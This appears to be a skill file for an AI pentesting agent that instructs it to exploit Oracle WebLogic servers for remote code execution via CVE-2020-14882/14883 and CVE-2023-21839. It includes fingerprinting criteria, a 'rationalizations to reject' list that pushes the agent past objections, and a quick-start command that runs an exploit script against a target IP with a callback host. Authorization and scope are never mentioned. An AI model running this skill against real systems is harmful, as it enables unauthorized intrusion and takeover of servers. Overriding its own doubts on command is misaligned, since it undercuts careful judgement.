---
name: weblogic-multi-cve-rce
description: Exploits WebLogic multiple CVEs for RCE (CVE-2020-14882/14883 auth bypass + XML RCE, CVE-2023-21839 T3 JNDI injection). Use when target runs Oracle WebLogic with exposed console or T3 ports.
skill_type: exploit
severity: critical
tags: [java, weblogic, cve-2020-14882, cve-2020-14883, cve-2023-21839]
cve: [CVE-2020-14882, CVE-2020-14883, CVE-2023-21839, CVE-2020-2551, CVE-2018-2894]
---

# WebLogic 多 CVE RCE

## Essential Principles

1. **CVE-2020-14882/14883 优先**：认证绕过 + XML RCE，纯 HTTP 不需要 T3
2. **CVE-2023-21839 备用**：T3/IIOP JNDI 注入，需回连
3. **控制台 7001 端口是 WebLogic 最明显特征**

## When to Use

- WebLogic Console 可访问（/console/login/LoginForm.jsp）
- 指纹/扫描器报告 WebLogic CVE
- 7001/7002 端口开放
- T3 协议可用（nmap --script weblogic-t3-enum）

## When NOT to Use

- 目标不是 Oracle WebLogic（Tomcat、JBoss 等）
- Console 路径全 404
- 已通过其他方式获得 shell

## Rationalizations to Reject

- "需要认证才能利用" → 14882 的作用就是绕过认证
- "T3 不通就放弃" → 14883 是纯 HTTP，不依赖 T3

## Quick Start
```bash
# 确认 WebLogic 存在
curl -s -o /dev/null -w "%{http_code}" {BASE_URL}/console/login/LoginForm.jsp

# 多 CVE 利用（自动尝试 HTTP + T3 路径）
python3 {skill_dir}/scripts/weblogic_exploit.py {TARGET_IP} {TARGET_PORT} --lhost {LHOST}
```

## 参考资料
- CVE 详情: [references/cve-details.md](references/cve-details.md)
